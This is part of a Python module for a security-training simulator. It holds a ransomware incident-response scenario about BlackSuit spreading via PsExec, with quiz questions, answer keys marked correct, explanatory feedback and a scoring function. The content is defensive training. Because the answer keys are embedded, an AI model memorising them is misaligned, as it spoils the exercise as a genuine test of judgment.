                "instruction": "Active ransomware deployment in progress. 14 workstations hit, 2 file servers encrypting. Assess the scope and urgency.",
                "type": "review",
                "hints": ["This is an ACTIVE incident — encryption is happening RIGHT NOW", "File servers contain critical business data", "Shadow copies already deleted — recovery from snapshots is impossible"],
                "questions": [
                    {
                        "id": "q1",
                        "text": "What is the current attack phase?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Active encryption phase — ransomware is executing on file servers and spreading to workstations via PsExec RIGHT NOW", "correct": True, "feedback": "Correct! This is the worst-case scenario — active encryption in progress. Every second of delay means more data encrypted. Shadow copies are already gone. Immediate containment is critical."},
                            {"id": "b", "text": "Reconnaissance — the attacker is still exploring", "correct": False, "feedback": "Far past recon. Files are ACTIVELY being encrypted with .blacksuit extension. 2,847 files already encrypted on SRV-FILE01."},
                            {"id": "c", "text": "The attack is over — focus on recovery", "correct": False, "feedback": "The attack is ONGOING. PsExec is still deploying to workstations and file servers are still encrypting. Containment first, then recovery."},
                        ],
                        "points": 10,
                    },
                ],
            },
            {
                "id": 2,
                "title": "Enrich the Ransomware",
                "instruction": "Identify the ransomware variant and understand its capabilities.",
                "type": "enrich",
                "hints": ["Check the file hash against threat intelligence", "BlackSuit is known for double extortion (encryption + data theft)"],
                "questions": [
                    {
                        "id": "q2",
                        "text": "The ransom note mentions data exfiltration. What additional concern does this raise?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Double extortion — even if backups exist, stolen data will be published unless ransom is paid", "correct": True, "feedback": "Correct! BlackSuit uses double extortion. They encrypt files AND steal data. Even with good backups, the stolen data creates regulatory, reputational, and legal risk. This affects the response strategy."},
                            {"id": "b", "text": "No additional concern — encryption is the only problem", "correct": False, "feedback": "Double extortion means data was exfiltrated BEFORE encryption. Restoring from backup doesn't solve the data theft problem."},
                            {"id": "c", "text": "The data is encrypted so they can't read it", "correct": False, "feedback": "The attacker steals data BEFORE encrypting it. They have a copy of your unencrypted files and will publish them on their leak site."},
                        ],
                        "points": 10,
                    },
                ],
            },
            {
                "id": 3,
                "title": "Emergency Containment",
                "instruction": "Encryption is active. You need to contain the spread immediately. Every second counts.",
                "type": "decision",
                "hints": ["Network isolation is the fastest way to stop spread", "Disable the compromised service account to prevent further PsExec", "Consider: which is more important — keeping systems online or stopping the encryption?"],
                "questions": [
                    {
                        "id": "q3",
                        "text": "Select ALL immediate containment actions (the first 5 minutes are critical):",
                        "type": "multi_select",
                        "options": [
                            {"id": "a", "text": "Disable svc_deploy account in AD immediately", "correct": True},
                            {"id": "b", "text": "Network-isolate SRV-FILE01 and SRV-FILE02 (pull the cable or disable switch port)", "correct": True},
                            {"id": "c", "text": "Block PsExec (port 445/SMB) at the network level between subnets", "correct": True},
                            {"id": "d", "text": "Kill the svchost32.exe process on all reachable affected hosts", "correct": True},
                            {"id": "e", "text": "Activate the incident response plan — declare a security incident", "correct": True},
                            {"id": "f", "text": "Disconnect affected workstations from the network", "correct": True},
                            {"id": "g", "text": "Check if offline backups exist (not connected to the network)", "correct": True},
                            {"id": "h", "text": "Send an email to all employees about the incident", "correct": False},
                            {"id": "i", "text": "Start negotiating with the ransomware group", "correct": False},
                            {"id": "j", "text": "Reboot the file servers to stop encryption", "correct": False},
                        ],
                        "points": 30,
                        "feedback_correct": "Excellent emergency response! Disable the deployment account (stops new PsExec), isolate file servers (stops encryption spread), block SMB laterally (prevents further movement), kill the ransomware process, activate IR, isolate workstations, and verify offline backups exist. Speed is everything in active ransomware.",
                        "feedback_partial": "You got some critical actions right, but in an active ransomware scenario, you need maximum speed. The priority is: 1) disable the deployment account, 2) isolate encrypting servers, 3) block lateral SMB. Don't negotiate or reboot — rebooting may cause partial encryption that's harder to recover from.",
                    },
                ],
            },
        ],
    },
}


def get_scenario_list() -> list[dict]:
    """Return a list of available scenarios (without full step data)."""
    return [
        {
            "id": s["id"],
            "title": s["title"],
            "difficulty": s["difficulty"],
            "role": s["role"],
            "estimated_minutes": s["estimated_minutes"],
            "description": s["description"],
            "tags": s["tags"],
            "total_steps": len(s["steps"]),
            "total_points": sum(
                q["points"]
                for step in s["steps"]
                for q in step.get("questions", [])
            ),
        }
        for s in SCENARIOS.values()
    ]


def get_scenario(scenario_id: str) -> Optional[dict]:
    """Return full scenario data for the simulation."""
    return SCENARIOS.get(scenario_id)


def score_answers(scenario_id: str, answers: dict[str, Any]) -> dict:
    """Score a set of answers against a scenario.

    Args:
        scenario_id: Which scenario
        answers: dict of {question_id: answer_id} or {question_id: [answer_ids]} for multi_select

    Returns:
        Scoring breakdown.
    """
    scenario = SCENARIOS.get(scenario_id)
    if not scenario:
        return {"error": "Scenario not found"}

    total_possible = 0
    total_earned = 0
    results = []

    for step in scenario["steps"]:
        for q in step.get("questions", []):
            total_possible += q["points"]
            answer = answers.get(q["id"])
            earned = 0
            correct = False
            feedback = ""

            if q["type"] == "multiple_choice":
                correct_option = next((o for o in q["options"] if o.get("correct")), None)
                if correct_option and answer == correct_option["id"]:
                    earned = q["points"]
                    correct = True
                    feedback = correct_option.get("feedback", "Correct!")
                else:
                    chosen = next((o for o in q["options"] if o["id"] == answer), None)
                    feedback = chosen.get("feedback", "Incorrect.") if chosen else "No answer provided."

            elif q["type"] == "multi_select":
                correct_ids = {o["id"] for o in q["options"] if o.get("correct")}
                selected = set(answer) if isinstance(answer, list) else set()
                correct_selected = selected & correct_ids
                incorrect_selected = selected - correct_ids

                if correct_selected == correct_ids and not incorrect_selected:
                    earned = q["points"]
                    correct = True
                    feedback = q.get("feedback_correct", "All correct!")
                elif correct_selected:
                    earned = round(q["points"] * len(correct_selected) / len(correct_ids) * 0.8)
                    feedback = q.get("feedback_partial", f"Partially correct: {len(correct_selected)}/{len(correct_ids)}")
                else:
                    feedback = "No correct actions selected."

            total_earned += earned
            results.append({
                "question_id": q["id"],
                "correct": correct,
                "earned": earned,
                "possible": q["points"],
                "feedback": feedback,
            })

    pct = round(total_earned / total_possible * 100) if total_possible else 0
    grade = "A" if pct >= 90 else "B" if pct >= 75 else "C" if pct >= 60 else "D" if pct >= 40 else "F"

    return {
        "scenario_id": scenario_id,
        "total_earned": total_earned,
        "total_possible": total_possible,
        "percentage": pct,
        "grade": grade,
        "results": results,
    }
